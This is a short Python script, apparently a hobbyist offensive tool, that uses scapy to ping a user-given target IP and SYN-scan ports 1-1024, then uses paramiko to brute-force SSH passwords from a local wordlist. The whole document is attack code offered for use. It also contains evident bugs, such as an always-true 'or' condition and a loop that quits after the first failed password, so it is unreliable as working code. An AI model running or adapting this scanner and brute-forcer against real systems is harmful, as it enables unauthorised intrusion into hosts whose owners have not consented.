from scapy.all import *
from scapy.layers.inet import IP, TCP, sr1, ICMP
import paramiko
Target = input("Target IP: ")
Registered_Ports = range(1, 1025)
open_ports = []
try:
    conf.verb = 0

    def scanip():
        for x in Target:
            alive = sr1(IP(dst=Target) / ICMP(), timeout=3)
            if alive is not None:
                print("[+] Host is up")
                return True
            else:
                print("[-] Host is down")
                return False
    if scanip() == True:
        def scanport():
            for port in Registered_Ports:
                source_port = random.randint(0, 65535)
                active = sr1(IP(dst=Target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5, )
                if active and active.haslayer(TCP) and active.getlayer(TCP).flags == 0x12:
                    disconnect = sr(IP(dst=Target) / TCP(sport=source_port, dport=port, flags="R"), timeout=0.5, )
                    open_ports.append(port)
        scanport()
        print(f"The scan is finished, the open ports are: {open_ports}")
        bruteforce = input("Do you want to brute force the ports? Y/N").lower()
        if bruteforce == "yes" or "y" and 22 in open_ports:
            def BruteForce():
                SSHconn = paramiko.SSHClient()
                SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                with open(r'C:\example\Password lists\Passwords.txt', "r") as f:
                    user = input("Please enter the username: ")
                    try:
                        for p in f:
                            p = p.replace("\n", "")
                            SSHconn.connect(hostname=Target, username=user, password=p, timeout=1, port=22)
                            print(f"[+] Logged in with {user} and {p} ")
                            break
                    except paramiko.ssh_exception.AuthenticationException as error:
                        print(f"[-]The password {error} has failed")
                    finally:
                        SSHconn.close()
            BruteForce()

        else:
            print("Bye Bye")
except Exception as e:
    print(f"an error has occurred {e}")
